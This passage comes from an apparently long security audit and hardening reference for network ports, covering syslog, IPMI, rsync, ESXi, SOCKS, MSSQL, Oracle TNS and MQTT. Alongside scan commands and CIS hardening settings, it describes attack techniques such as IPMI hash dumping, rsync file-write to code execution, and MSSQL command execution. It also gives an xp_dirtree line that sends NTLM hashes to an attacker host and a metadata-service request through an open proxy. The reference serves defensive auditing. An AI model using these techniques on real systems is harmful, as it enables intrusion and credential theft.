    * Enforce **Mutual Certificate Authentication (mTLS / X.509 PKI)** or `EAP-TLS` instead of Pre-Shared Keys. Where PSKs are unavoidable on site-to-site links, use cryptographically random 64-byte (`512-bit`) keys (`openssl rand -base64 64`) and Post-Quantum Preshared Keys (**PPK**, RFC 8784).
    * Restrict IKE & ESP proposals strictly to AEAD ciphers and elliptic-curve / 3072-bit+ DH groups: `aes256gcm16-prfsha384-ecp384` or `chacha20poly1305-prfsha256-curve25519`.

---

### [PORT-21] Ports 514/UDP, 514/TCP, 6514/TCP — Syslog & Syslog over TLS (rsyslog / syslog-ng)

* **Transport Protocol & IANA Assignment**:
  * `514/UDP`: Traditional RFC 3164 / RFC 5426 connectionless Syslog (note: `514/TCP` is historically assigned to BSD `rsh` Remote Shell, though commonly repurposed for cleartext TCP Syslog).
  * `6514/TCP`: IANA-standardized Syslog over TLS (RFC 5425).
* **RFC Specification**: RFC 3164 (The BSD Syslog Protocol — Obsoleted), RFC 5424 (The Syslog Protocol), RFC 5425 (Transport Layer Security (TLS) Transport Mapping for Syslog), RFC 5848 (Signed Syslog Messages).
* **Architecture & Handshake Overview**:
  Syslog transmits structured or unstructured event telemetry from generators (routers, firewalls, Linux hosts) to central collectors/SIEMs.
  1. **Message Format (`PRI` + `HEADER` + `STRUCTURED-DATA` + `MSG`)**:
     * Every message starts with `<PRI>`, where $\text{PRI} = (\text{Facility} \times 8) + \text{Severity}$. Facilities range from `0` (`kern`) and `4`/`10` (`auth`/`authpriv`) to `16`–`23` (`local0`–`local7`). Severities range from `0` (`Emergency`) to `7` (`Debug`).
  2. **UDP vs. TLS Framing**: Over `514/UDP`, each datagram carries a single unauthenticated, unencrypted log entry. Over `6514/TCP` (RFC 5425), messages are octet-counted (`MSG-LEN SP SYSLOG-MSG`) inside a mutually authenticated TLS 1.2/1.3 stream.
* **Authorized Security Audit Checklist**:
  * **Log Spoofing & SIEM Poisoning**: Because `514/UDP` is connectionless and lacks authentication, any host able to send UDP packets to the collector can forge `<34>1 2026-11-02T08:00:00Z prod-dc01 sshd ...` with a spoofed source IP address to trigger false alerts, blind SOC analysts, or exploit log-parsing vulnerabilities (XSS in SIEM web UIs, Log4Shell-style JNDI lookups, or terminal escape sequence injection).
  * **Sensitive Data Exposure in Transit**: Cleartext `514/UDP` or `514/TCP` exposes audit logs (`auditd` `EXECVE` command lines, web query strings, firewall session tables) to passive network sniffing.
  * **Legacy BSD `rshd` (`514/TCP`) Check**: When `514/TCP` is open on legacy UNIX/Solaris/AIX systems, verify whether it is actually running the Berkeley Remote Shell (`in.rshd`) trusting `~/.rhosts` or `/etc/hosts.equiv` (`+ +`).
* **Diagnostic & Auditing Commands**:
  ```bash
  # 1. Verify if 6514/TCP enforces mutual TLS (mTLS) client certificate authentication
  openssl s_client -connect <syslog-collector-ip>:6514 -tls1_3

  # 2. Send a benign test RFC 5424 message over TLS to verify collector ingestion
  logger --server <syslog-collector-ip> --port 6514 --tcp --rfc5424 "AUDIT_VERIFY: Authorized connectivity test"
  ```
* **Common Configuration Weaknesses**:
  * Central SIEM log collectors listening on `514/UDP` across general corporate VLANs without source verification or TLS encryption.
* **CIS Hardening & NIST SP 800-53 Controls**:
  * **Rsyslog Mutual TLS Hardening (`/etc/rsyslog.d/10-tls-forward.conf` — CIS Linux Benchmark 4.2.1.x)**:
    ```apache
    global(
      DefaultNetstreamDriver="gtls"
      DefaultNetstreamDriverCAFile="/etc/pki/rsyslog/ca.pem"
      DefaultNetstreamDriverCertFile="/etc/pki/rsyslog/client-cert.pem"
      DefaultNetstreamDriverKeyFile="/etc/pki/rsyslog/client-key.pem"
    )
    action(
      type="omfwd"
      Target="siem.corp.example.com"
      Port="6514"
      Protocol="tcp"
      StreamDriver="gtls"
      StreamDriverMode="1"
      StreamDriverAuthMode="x509/name"
      StreamDriverPermittedPeers="siem.corp.example.com"
      queue.type="LinkedList"
      queue.filename="fwdRule1"
      queue.saveonshutdown="on"
    )
    ```
  * **NIST Mapping**: AU-9 (Protection of Audit Information), SC-8 (Transmission Confidentiality and Integrity).

---

### [PORT-22] Port 548/TCP — Apple Filing Protocol (AFP over TCP / Netatalk)

* **Transport Protocol & IANA Assignment**: `548/TCP` (Apple Filing Protocol over Data Stream Interface `DSI`).
* **RFC Specification**: Apple Filing Protocol Programming Guide / Reference (Proprietary Apple specification; open-source Linux/NAS implementation: `Netatalk`).
* **Architecture & Handshake Overview**:
  AFP was macOS's native network file sharing and Time Machine backup protocol prior to its official deprecation by Apple in favor of SMBv3 (macOS Big Sur 11.0+ removed the AFP Server component, though NAS appliances like Synology, QNAP, TrueNAS, and Linux servers running `Netatalk` still expose `548/TCP`).
  1. **DSI Framing & `DSIGetStatus`**: Client connects to `548/TCP` and sends a `DSIGetStatus` (`FPGetSrvrInfo`) request. The server replies without authentication, returning the `ServerName`, `MachineType` (e.g., `Netatalk 3.1.12`), supported `AFPVersion` strings (`AFP3.4`), and supported **User Authentication Modules (UAMs)**: `No User Authent` (Guest), `Cleartxt Passwrd`, `Randnum Exchange`, `DHCAST128`, or `DHX2` (Diffie-Hellman Key Exchange 2).
* **Authorized Security Audit Checklist**:
  * Query `FPGetSrvrInfo` (`afp-serverinfo`) to fingerprint exact `Netatalk` versions and supported UAMs.
  * Check for critical pre-authentication Remote Code Execution vulnerabilities in `Netatalk` (such as **CVE-2018-1160** out-of-bounds write in `dsi_opensession.c` allowing unauthenticated root RCE, or **CVE-2022-23121** / **CVE-2023-42464**).
  * Test if `No User Authent` (Guest login) is enabled and enumerate shared volumes (`afp-ls`, `afp-showmount`).
* **Diagnostic & Auditing Commands**:
  ```bash
  # 1. Nmap AFP server info disclosure, UAM enumeration, and share discovery
  nmap -sV -p 548 --script afp-serverinfo,afp-showmount,afp-ls <target-ip>
  ```
* **Common Configuration Weaknesses**:
  * NAS storage appliances leaving legacy AFP (`Netatalk`) enabled for Time Machine backups when modern macOS natively uses SMB3 over `445/TCP` for Time Machine.
* **CIS Hardening & NIST SP 800-53 Controls**:
  * Disable AFP (`Netatalk`) completely on all NAS appliances and Linux file servers (`systemctl disable --now netatalk`), migrating all macOS clients to SMB 3.1.1 with encryption required.

---

### [PORT-23] Port 623/UDP, 623/TCP — Intelligent Platform Management Interface (IPMI v2.0 / RMCP+)

* **Transport Protocol & IANA Assignment**: `623/UDP` (and `623/TCP`): Remote Management Control Protocol (`RMCP` / `RMCP+`) for Baseboard Management Controllers (BMCs: Dell iDRAC, HPE iLO, Supermicro BMC, Lenovo XClarity).
* **RFC Specification**: Intel / Hewlett-Packard / NEC / Dell *IPMI Specification v2.0 Revision 1.1*.
* **Architecture & Handshake Overview**:
  IPMI operates out-of-band on a dedicated Baseboard Management Controller (BMC) chip that runs independently of the host CPU, BIOS, and operating system—allowing power cycling, virtual media ISO mounting, serial-over-LAN (SOL), and KVM console access even when the server is powered off.
  1. **Session Setup (`RMCP+ Open Session` & `RAKP` Exchange)**:
     * Client and BMC exchange `RMCP+ Open Session Request/Response`.
     * **Remote Authenticated Key-Exchange Protocol (RAKP Messages 1–4)**:
       * In `RAKP Message 1`, the client sends the requested `Username` (e.g., `admin`, `root`, `ADMIN`) and a client random nonce $R_M$.
       * In `RAKP Message 2`, **due to a fundamental design flaw in the IPMI v2.0 specification**, the BMC responds to any unauthenticated client with its server nonce $R_C$, GUID, and an `HMAC-SHA1` (or `HMAC-MD5`) hash calculated over $(SID_M \parallel SID_C \parallel R_M \parallel R_C \parallel GUID_C \parallel \text{Role} \parallel \text{Username})$ keyed directly with the user's stored cleartext password!
* **Authorized Security Audit Checklist**:
  * **IPMI 2.0 RAKP Offline Password Hash Dumper (Design Flaw)**: Any unauthenticated attacker who can reach `623/UDP` can send a single `RAKP Message 1` for a valid BMC username (`root`, `admin`, `ADMIN`) and receive `RAKP Message 2` containing the unsalted/nonce-salted HMAC-SHA1 hash of the user's password, ready for offline GPU cracking (`hashcat -m 7300`).
  * **Cipher Suite Zero (`Cipher 0`) Authentication Bypass**: In the IPMI 2.0 spec, Cipher Suite ID `0` specifies: Authentication Algorithm = `RAKP-none`, Integrity Algorithm = `none`, Confidentiality Algorithm = `none`. On vulnerable BMCs, requesting Cipher Suite `0` allows logging in as `admin` with any arbitrary password.
  * **Anonymous / Null User (`User ID 1`)**: Check if the default anonymous user slot is enabled.
* **Diagnostic & Auditing Commands**:
  ```bash
  # 1. Nmap IPMI version discovery and Cipher Zero vulnerability check (Non-destructive)
  sudo nmap -sU -p 623 --script ipmi-version,ipmi-cipher-zero <target-ip>

  # 2. Query BMC channel authentication capabilities and Cipher Suites via ipmitool
  ipmitool -I lanplus -H <target-ip> -U admin -P "<password>" channel authcap 1 4
  ipmitool -I lanplus -H <target-ip> -U admin -P "<password>" lan print 1
  ```
* **Common Configuration Weaknesses**:
  * Connecting BMC (iDRAC/iLO) network interfaces to production server VLANs or exposing `623/UDP` to general internal subnets instead of a physically isolated Out-of-Band (OOB) Management Network.
  * Leaving IPMI over LAN (`623/UDP`) enabled when modern Redfish REST API over HTTPS (`443/TCP`) is available.
* **CIS Hardening & NIST SP 800-53 Controls**:
  * **Disable IPMI over LAN & Migrate to Redfish over TLS 1.3**:
    * In Dell iDRAC (`racadm set iDRAC.IPMILan.Enable 0`) and HPE iLO, disable **IPMI over LAN (`623/UDP`)** completely. Perform all out-of-band hardware automation via the **DMTF Redfish API** (`443/TCP`) backed by Active Directory/OIDC SSO.
    * Physically isolate all BMC management NICs onto a dedicated, non-routable OOB Management VLAN accessible exclusively through a jump host with hardware MFA.
    * If IPMI over LAN cannot be disabled on legacy hardware, disable Cipher Suite `0` (`ipmitool lan set 1 cipher_privs Xaaaaaaaaaaaaaa`) and enforce 32-character random BMC passwords to resist offline RAKP hash cracking.

---

### [PORT-24] Port 873/TCP — Rsync Daemon Protocol

* **Transport Protocol & IANA Assignment**: `873/TCP` (Native standalone `rsync --daemon` wire protocol; distinct from running `rsync` over an encrypted `22/TCP` SSH transport).
* **RFC Specification**: Rsync Open-Source Protocol Specification (Protocol versions 27–31; Tridgell & Mackerras rolling-checksum delta-transfer algorithm).
* **Architecture & Handshake Overview**:
  When `rsync` runs as a standalone daemon listening directly on `873/TCP` (configured via `/etc/rsyncd.conf`), it does not use SSH or TLS encryption:
  1. **Version & Module Handshake**: Upon TCP connection, the server sends `@RSYNCD: <version>.<subprotocol>` (e.g., `@RSYNCD: 31.0 sha512 sha256 sha1 md5 md4`). The client echoes its `@RSYNCD: 31.0` version string followed by either `#list` (or an empty newline) to list all published **modules** (shared directory trees), or `<module_name>\n` to select a target module.
  2. **Authentication**: If the module requires authentication (`auth users` and `secrets file` in `/etc/rsyncd.conf`), the server sends `@RSYNCD: AUTHREQD <base64-challenge>`, and the client replies with `<username> <hash(password + challenge)>`. If `auth users` is omitted, the module is completely unauthenticated (`@RSYNCD: OK`).
* **Authorized Security Audit Checklist**:
  * **Unauthenticated Module Listing & File Exfiltration**: Connect to `873/TCP` and issue a listing request (`rsync rsync://<target-ip>:873/`). Test every returned module for unauthenticated read access (`backups`, `www`, `home`, `src`).
  * **Arbitrary File Write -> Remote Code Execution**: If an unauthenticated or weakly authenticated module has `read only = no`, an attacker can upload a `.ssh/authorized_keys` file into a user's home directory, upload a cron job into `/etc/cron.d/` (if `uid = root`), or drop a web shell into `/var/www/html`.
  * **Daemon Memory Corruption CVEs**: Verify `rsync` daemon version is patched against **CVE-2024-12084** (heap buffer overflow in checksum length handling in `rsync < 3.4.0` leading to unauthenticated RCE on `873/TCP`) and **CVE-2024-12085** / **CVE-2024-12087**.
* **Diagnostic & Auditing Commands**:
  ```bash
  # 1. Enumerate all published Rsync modules and their comments without authentication
  rsync --list-only rsync://<target-ip>:873/

  # 2. List files inside a discovered Rsync module (non-destructive directory listing)
  rsync --list-only rsync://<target-ip>:873/<module_name>/

  # 3. Nmap Rsync module discovery and brute-force check
  nmap -sV -p 873 --script rsync-list-modules <target-ip>
  ```
* **Common Configuration Weaknesses**:
  * Running `rsync --daemon` with `uid = root`, `gid = root`, `read only = no`, and no `auth users` or `hosts allow` directives for internal server-to-server file synchronization.
* **CIS Hardening & NIST SP 800-53 Controls**:
  * **Eliminate Standalone `873/TCP` Daemon (CIS Linux Benchmark 2.2.x)**:
    * Stop and mask `rsync.service` (`systemctl disable --now rsync`). Run all `rsync` transfers exclusively over **OpenSSH (`-e "ssh -p 22"`)** restricted by `rrsync` (restricted rsync wrapper script in `~/.ssh/authorized_keys`).
    * If a standalone daemon is mandatory (e.g., public open-source OS mirror), upgrade to `rsync >= 3.4.0`, run under an unprivileged dedicated user (`uid = nobody`), enforce `use chroot = yes`, `read only = yes`, `munge symlinks = yes`, and bind via `hosts allow`.

---

### [PORT-25] Ports 902/TCP, 902/UDP, 903/TCP — VMware ESXi Authentication, NFC & Console Protocol

* **Transport Protocol & IANA Assignment**:
  * `902/TCP` & `902/UDP`: VMware ESXi `vpxa` / `hostd` Network File Copy (`NFC`), vCenter Server heartbeat, and VMware Remote Console (`VMRC` / `MKS` Mouse-Keyboard-Screen).
  * `903/TCP`: Legacy VMware Remote Console stream.
* **RFC Specification**: VMware vSphere / ESXi Proprietary Wire Protocol (`vmodl`, `NFC`, `VMRC`).
* **Architecture & Handshake Overview**:
  Port `902/TCP` is the primary management and disk-streaming multiplexer on VMware ESXi hypervisors:
  1. **Banner Handshake**: Connecting to `902/TCP` immediately yields an unencrypted banner before TLS wraps the session: `220 VMware Authentication Daemon Version 1.10: SSL Required, ServerDaemonProtocol:SOAP, MKSDisplayProtocol:VNC , VMXARGS supported, NFCSSL supported/t`.
  2. **Sub-Protocols**: Over `902/TCP`, vCenter Server (`vpxd`), Veeam Backup agents (VDDK — Virtual Disk Development Kit), and ESXi hosts stream raw Virtual Machine Disks (`.vmdk`) via the **Network File Copy (NFC)** protocol and stream interactive VM graphical consoles via **MKS**.
* **Authorized Security Audit Checklist**:
  * **Hypervisor Exposure & Ransomware Surface**: ESXi hypervisors (`902/TCP` and `443/TCP`) are the #1 high-value target for enterprise ransomware groups (ESXiArgs, BlackCat, Akira). Verify `902/TCP` is never reachable from general user VLANs or the public Internet.
  * **Service Fingerprint & Patch Level**: Extract the exact ESXi build number via SOAP queries on `443/TCP` paired with `902/TCP` banner inspection, and check for critical hypervisor vulnerabilities (e.g., OpenSLP `427/UDP`/`427/TCP` heap overflows CVE-2021-21974 / CVE-2023-20867, or ESXi Active Directory integration authentication bypass **CVE-2024-37085** where creating an AD group named `ESX Admins` grants instant full hypervisor admin access).
* **Diagnostic & Auditing Commands**:
  ```bash
  # 1. Fingerprint VMware ESXi Authentication Daemon on Port 902 and SOAP version on Port 443
  nmap -sV -p 443,902 --script vmware-version <target-ip>

  # 2. Grab raw VMware Authd banner and TLS certificate details on Port 902
  nc -nv -w 3 <target-ip> 902
  openssl s_client -connect <target-ip>:902 -showcerts </dev/null
  ```
* **Common Configuration Weaknesses**:
  * Joining ESXi hosts directly to Active Directory without modifying the default `Config.HostAgent.plugins.hostsvc.esxAdminsGroup` setting (vulnerable to CVE-2024-37085).
  * Leaving ESXi Shell and SSH (`TSM-SSH`) permanently enabled without Lockdown Mode.
* **CIS Hardening & NIST SP 800-53 Controls**:
  * **CIS VMware ESXi 8.0 Benchmark Hardening**:
    * Enable **Strict or Normal Lockdown Mode** so the ESXi host can only be managed centrally through vCenter Server, blocking direct `root` API/UI logins.
    * Configure the built-in **ESXi Firewall** (`esxcli network firewall ruleset set --ruleset-id=vpxHeartbeats --allowed-all=false`) to permit `902/TCP` and `443/TCP` strictly from the vCenter Server IP and dedicated Veeam/backup proxy IPs.
    * Disable OpenSLP (`esxcli system slp stats get` -> `chkconfig slpd off`) and avoid joining ESXi hosts directly to AD (authenticate admins at the vCenter SSO layer with FIDO2 MFA).

---

### [PORT-26] Port 1080/TCP, 1080/UDP — SOCKS Proxy Protocol (SOCKS4 / SOCKS4a / SOCKS5)

* **Transport Protocol & IANA Assignment**: `1080/TCP` & `1080/UDP` (Socket Secure proxy server; commonly deployed via Dante `sockd`, `3proxy`, `microsocks`, or `ssh -D`).
* **RFC Specification**: RFC 1928 (SOCKS Protocol Version 5), RFC 1929 (Username/Password Authentication for SOCKS V5), RFC 1961 (GSS-API Authentication Method for SOCKS Version 5).
* **Architecture & Handshake Overview**:
  Operating at OSI Layer 5 (Session Layer), SOCKS5 proxies arbitrary TCP connections and UDP datagrams transparently without parsing Layer 7 application protocols:
  1. **Method Selection (`VER` `0x05`, `NMETHODS`, `METHODS`)**: Client sends `0x05` followed by supported auth methods (`0x00` No Authentication Required, `0x01` GSSAPI, `0x02` Username/Password). Server replies `0x05 <chosen_method>`.
  2. **Connection Request (`CMD`, `ATYP`, `DST.ADDR`, `DST.PORT`)**: Client issues `0x01` (`CONNECT`), `0x02` (`BIND`), or `0x03` (`UDP ASSOCIATE`), specifying the destination address type (`0x01` IPv4, `0x03` Domain Name [SOCKS5/SOCKS4a remote DNS resolution], or `0x04` IPv6). The proxy establishes the downstream connection and relays raw bytes bidirectionally.
* **Authorized Security Audit Checklist**:
  * **Unauthenticated (`0x00`) Open Proxy Pivoting**: Check if the SOCKS5 listener responds with `0x05 0x00` (No Authentication). An open SOCKS5 proxy on a dual-homed server or cloud VM allows an attacker to pivot directly into internal RFC 1918 subnets (`10.0.0.0/8`), access the cloud instance metadata service (`169.254.169.254`), or use the enterprise's public IP reputation for external attacks.
  * **Indicator of Compromise (IoC) Assessment**: Unexplained `1080/TCP` (or high-port SOCKS5) listeners on internal workstations or servers frequently indicate an active C2 reverse-proxy implant (`Chisel`, `Ligolo-ng`, `frp`, `Sliver`, `Cobalt Strike` SOCKS proxy).
* **Diagnostic & Auditing Commands**:
  ```bash
  # 1. Nmap check for open SOCKS4/SOCKS5 proxy and supported authentication methods
  nmap -sV -p 1080 --script socks-open-proxy,socks-auth-info <target-ip>

  # 2. Test routing an HTTP request through a target SOCKS5 proxy (with remote DNS socks5h://)
  curl -v --proxy socks5h://<target-ip>:1080 http://169.254.169.254/latest/meta-data/
  ```
* **Common Configuration Weaknesses**:
  * Developer or operations staff starting `microsocks` or `dante-server` bound to `0.0.0.0:1080` with `clientmethod: none` and `socksmethod: none`.
* **CIS Hardening & NIST SP 800-53 Controls**:
  * Never bind SOCKS proxies to `0.0.0.0` without mutual TLS or GSSAPI authentication. In Dante (`/etc/danted.conf`), enforce `socksmethod: gssapi` or `username`, explicitly block loopback and cloud metadata ranges (`socks block { from: 0.0.0.0/0 to: 169.254.0.0/16 }`), and prefer WireGuard (`51820/UDP`) or Zero-Trust Network Access (ZTNA) tunnels over SOCKS proxies.

---

### [PORT-27] Ports 1433/TCP, 1434/UDP — Microsoft SQL Server (Tabular Data Stream TDS & SQL Browser)

* **Transport Protocol & IANA Assignment**:
  * `1433/TCP`: Default Microsoft SQL Server instance listener using the **Tabular Data Stream (TDS)** protocol (versions 7.4 and 8.0).
  * `1434/UDP` (and `1434/TCP`): SQL Server Browser Service (`sqlbrowser.exe`), which maps named instances (e.g., `SERVER\SQLEXPRESS`) to their dynamically assigned TCP ports (`49152+`) and Dedicated Administrator Connection (`DAC`) ports.
* **RFC Specification**: Microsoft `[MS-TDS]` (Tabular Data Stream Protocol v7.4 / v8.0), `[MS-SQLR]` (SQL Server Resolution Protocol on `1434/UDP`).
* **Architecture & Handshake Overview**:
  1. **TDS 7.x (`PRELOGIN` Wrapping TLS)**: Historically, TDS starts with an unencrypted `PRELOGIN` packet (`0x12`) exchanging version numbers, instance names, and `ENCRYPT_OFF` / `ENCRYPT_ON` / `ENCRYPT_REQ` flags. The TLS handshake packets are then encapsulated *inside* TDS `0x12` frames prior to the `LOGIN7` packet (which authenticates via SQL Server Auth `sa` or Windows Integrated SSPI/Kerberos/NTLMSSP).
  2. **TDS 8.0 (SQL Server 2022+ `Strict` Encryption)**: Eliminates TDS-wrapped TLS in favor of a standard, RFC-compliant TLS 1.3 handshake directly on `1433/TCP` *before* any TDS `PRELOGIN` bytes are exchanged, allowing standard TLS inspection proxies and ALPN (`tds/8.0`) to function securely.
* **Authorized Security Audit Checklist**:
  * **SQL Browser Enumeration (`1434/UDP`)**: Sending a single byte `0x02` (`CLNT_UCAST_EX`) to `1434/UDP` returns a plaintext semicolon-delimited string disclosing the exact SQL Server version (`Version`), clustered status, named pipes, and dynamic TCP ports for every installed SQL instance without authentication.
  * **Authentication & `sa` Account Abuse**: Check if Mixed Mode Authentication is enabled with a weak or default `sa` password, or if low-privileged Active Directory domain users (`Domain Users`) are mapped to a `PUBLIC` or `sysadmin` login.
  * **OS Command Execution Primitives**: Once authenticated, audit whether dangerous server configurations or impersonation chains allow OS execution or outbound NTLM hash coercion:
    * `xp_cmdshell` (`EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`).
    * OLE Automation Procedures (`sp_OACreate` / `sp_OAMethod` `WScript.Shell`).
    * Custom CLR Assemblies (`CREATE ASSEMBLY ... WITH PERMISSION_SET = UNSAFE`).
    * Outbound UNC Path Coercion (`EXEC master..xp_dirtree '\\<attacker-ip>\share';` or `xp_fileexist`), which forces the SQL Server service account to send its NetNTLMv2 hash to an attacker listener.
    * **Linked Server Hopping (`sp_linkedservers`)**: Audit bidirectional trust links (`EXEC ('...') AT [LINKED_SQL_PROD]`) that elevate privileges across database tiers.
* **Diagnostic & Auditing Commands**:
  ```bash
  # 1. Nmap discovery of SQL Server version, named instances (1434/UDP), and NTLM/TLS info
  sudo nmap -sU -sT -p T:1433,U:1434 --script ms-sql-info,ms-sql-ntlm-info,ssl-enum-ciphers <target-ip>

  # 2. Authenticate via Impacket mssqlclient (Windows Auth / Kerberos -k) and audit privileges
  impacket-mssqlclient -windows-auth -k CORP/auditor@<sql-fqdn>

  # 3. T-SQL Audit Queries (run inside sqlcmd / mssqlclient to check hardening state):
  # SELECT name, value_in_use FROM sys.configurations WHERE name IN ('xp_cmdshell', 'Ole Automation Procedures', 'clr enabled', 'clr strict security', 'cross db ownership chaining');
  # SELECT srvname, srvproduct, providername FROM master..sysservers;
  ```
* **Common Configuration Weaknesses**:
  * Running the `MSSQLSERVER` Windows service as `NT AUTHORITY\SYSTEM`, `LocalSystem`, or a Domain Admin user account instead of a least-privilege virtual account (`NT Service\MSSQLSERVER`) or gMSA.
  * Leaving `TRUSTWORTHY ON` on databases owned by `sa` where non-sysadmin users have `db_owner` rights (enabling `WITH EXECUTE AS OWNER` privilege escalation to `sysadmin`).
* **CIS Hardening & NIST SP 800-53 Controls**:
  * **CIS Microsoft SQL Server 2019/2022 Benchmark Hardening**:
    ```sql
    -- 1. Disable dangerous OS execution and OLE/CLR features (CIS 2.2, 2.3, 2.14, 2.15)
    EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
    EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
    EXEC sp_configure 'Ole Automation Procedures', 0; RECONFIGURE;
    EXEC sp_configure 'Ad Hoc Distributed Queries', 0; RECONFIGURE;
    EXEC sp_configure 'clr strict security', 1; RECONFIGURE;

    -- 2. Disable and rename the legacy 'sa' account; enforce Windows-Only Authentication (CIS 2.13, 3.1)
    ALTER LOGIN [sa] DISABLE;
    ALTER LOGIN [sa] WITH NAME = [disabled_legacy_sysadmin];
    EXEC xp_instance_regwrite N'HKEY_LOCAL_MACHINE', N'Software\Microsoft\MSSQLServer\MSSQLServer', N'LoginMode', REG_DWORD, 1;

    -- 3. Revoke PUBLIC execution permissions on UNC path coercion extended stored procedures
    USE [master];
    REVOKE EXECUTE ON [sys].[xp_dirtree] TO [public];
    REVOKE EXECUTE ON [sys].[xp_fileexist] TO [public];
    REVOKE EXECUTE ON [sys].[xp_subdirs] TO [public];
    ```
  * Disable the **SQL Server Browser (`1434/UDP`)** service (`Set-Service -Name SQLBrowser -StartupType Disabled`) and enforce **Force Strict Encryption (TDS 8.0)** with a valid PKI certificate + Extended Protection for Authentication (Channel Binding).

---

### [PORT-28] Port 1521/TCP (2483/TCP, 2484/TCP) — Oracle Transparent Network Substrate (TNS Listener)

* **Transport Protocol & IANA Assignment**:
  * `1521/TCP`: Default Oracle Net Listener (`tnslsnr`) port.
  * `2483/TCP` & `2484/TCP`: IANA-registered Oracle TTC / TCPS (TLS-encrypted Oracle Net).
* **RFC Specification**: Oracle Net Services Proprietary Wire Protocol (Transparent Network Substrate `TNS` / Two-Task Common `TTC`).
* **Architecture & Handshake Overview**:
  1. **TNS Connect & Redirect/Accept**: Client sends a `TNS Connect` packet (`0x01`) containing a descriptor string: `(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST=10.0.0.50)(PORT=1521))(CONNECT_DATA=(SERVICE_NAME=ORCL)))`.
  2. **Handshake**: The `tnslsnr` daemon validates the requested **SID** (System Identifier) or **Service Name**, and returns either `TNS Accept` (`0x02`), `TNS Refuse` (`0x04` with error code `TNS-12505` / `TNS-12514` if the SID/Service is invalid), or `TNS Redirect` (`0x05`) instructing the client to connect to a dedicated server process port.
  3. **Authentication (`O5LOGON`)**: Oracle authenticates via the `AUTH_SESSKEY` challenge-response protocol (`O5LOGON`). In Oracle 11g (`10G`/`11G` password verifier), the server returns `AUTH_SESSKEY` and `AUTH_VFR_DATA` (salt) to any unauthenticated user who supplies a valid username (`SYS`, `SYSTEM`, `DBSNMP`, `SCOTT`), allowing offline password cracking (`CVE-2012-3137`). Oracle 12cR2+ uses PBKDF2-SHA512 (`O5LOGON` v12).
* **Authorized Security Audit Checklist**:
  * **Unauthenticated TNS Listener Commands (`STATUS`, `VERSION`, `SERVICES`)**: On legacy or misconfigured listeners without `ADMIN_RESTRICTIONS_LISTENER=ON`, an unauthenticated attacker can send `(CONNECT_DATA=(COMMAND=status))` or `(COMMAND=version)` directly to `1521/TCP` to dump the OS platform, Oracle home path, log file paths (enabling log-file overwrite attacks), and all registered database SIDs/Service Names without guessing.
  * **SID / Service Name Brute-Forcing**: Enumerate valid SIDs (`ORCL`, `XE`, `PROD`, `CDB1`, `FREEPDB1`).
  * **TNS Poisoning (CVE-2012-1675)**: Verify that `VALID_NODE_CHECKING_REGISTRATION_LISTENER = ON` (or `SUBNET`) is active so a remote attacker cannot register a rogue database instance with the listener to MITM incoming client connections.
* **Diagnostic & Auditing Commands**:
  ```bash
  # 1. Nmap Oracle TNS version, status check, and SID enumeration
  nmap -sV -p 1521 --script oracle-tns-version,oracle-sid-brute <target-ip>

  # 2. Comprehensive Oracle security assessment using ODAT (Oracle Database Attacking Tool)
  odat all -s <target-ip> -p 1521
  ```
* **Common Configuration Weaknesses**:
  * Missing `VALID_NODE_CHECKING_REGISTRATION_LISTENER = ON` and `ADMIN_RESTRICTIONS_LISTENER = ON` in `$ORACLE_HOME/network/admin/listener.ora`.
  * Allowing `SEC_CASE_SENSITIVE_LOGON = FALSE` or retaining `SQLNET.ALLOWED_LOGON_VERSION_SERVER = 8` / `10` in `sqlnet.ora` (which preserves weak DES/SHA-1 password hashes in `sys.user$`).
* **CIS Hardening & NIST SP 800-53 Controls**:
  * **CIS Oracle Database 19c/23ai Hardening (`listener.ora` & `sqlnet.ora`)**:
    ```ini
    # $ORACLE_HOME/network/admin/listener.ora
    ADMIN_RESTRICTIONS_LISTENER = ON
    SECURE_REGISTER_LISTENER = (TCP, IPC)
    VALID_NODE_CHECKING_REGISTRATION_LISTENER = ON

    # $ORACLE_HOME/network/admin/sqlnet.ora
    SQLNET.ENCRYPTION_SERVER = REQUIRED
    SQLNET.ENCRYPTION_TYPES_SERVER = (AES256)
    SQLNET.CRYPTO_CHECKSUM_SERVER = REQUIRED
    SQLNET.CRYPTO_CHECKSUM_TYPES_SERVER = (SHA512)
    SQLNET.ALLOWED_LOGON_VERSION_SERVER = 12a
    TCP.VALIDNODE_CHECKING = YES
    TCP.INVITED_NODES = (10.10.20.10, 10.10.20.11)
    ```

---

### [PORT-29] Ports 1883/TCP, 8883/TCP — Message Queuing Telemetry Transport (MQTT / IoT Broker)

* **Transport Protocol & IANA Assignment**:
  * `1883/TCP`: Unencrypted MQTT broker port (Eclipse Mosquitto, EMQX, HiveMQ, AWS IoT Core).
  * `8883/TCP`: MQTT over TLS (`MQTTS`).
  * `8083/TCP` & `8084/TCP`: MQTT over WebSockets (`ws://` / `wss://`).
* **RFC Specification**: OASIS Standard *MQTT Version 3.1.1* and *MQTT Version 5.0* (ISO/IEC 20922).
* **Architecture & Handshake Overview**:
  MQTT is a lightweight binary publish/subscribe messaging protocol used extensively across Industrial IoT (IIoT), smart buildings, connected vehicles, and telemetry pipelines:
  1. **Connection (`CONNECT` -> `CONNACK`)**: Client sends a `CONNECT` control packet (`0x10`) containing `Protocol Name` (`MQTT`), `Protocol Level` (`4` for v3.1.1, `5` for v5.0), `Connect Flags` (`User Name Flag`, `Password Flag`, `Clean Session`), `Client Identifier`, and optional credentials. The broker responds with `CONNACK` (`0x20`) containing a Return/Reason Code (`0x00` = Connection Accepted; `0x04`/`0x05` = Bad Credentials / Not Authorized).
  2. **Topic Hierarchy & Wildcards (`SUBSCRIBE` / `PUBLISH`)**: Topics are UTF-8 slash-delimited strings (`factory/line1/plc04/command`). Clients can subscribe using single-level wildcards (`+`) or multi-level wildcards (`#`). Subscribing to `#` streams every non-system message traversing the broker, while subscribing to `$SYS/#` leaks internal broker diagnostics, connected client counts, version strings, and uptime.
* **Authorized Security Audit Checklist**:
  * **Anonymous Broker Access (`allow_anonymous true`)**: Connect to `1883/TCP` or `8883/TCP` without a username/password and subscribe to `#` and `$SYS/#`. Thousands of industrial and smart-building brokers expose live GPS coordinates, smart-lock unlock commands, industrial sensor readings, and OTA firmware update URLs to unauthenticated subscribers.
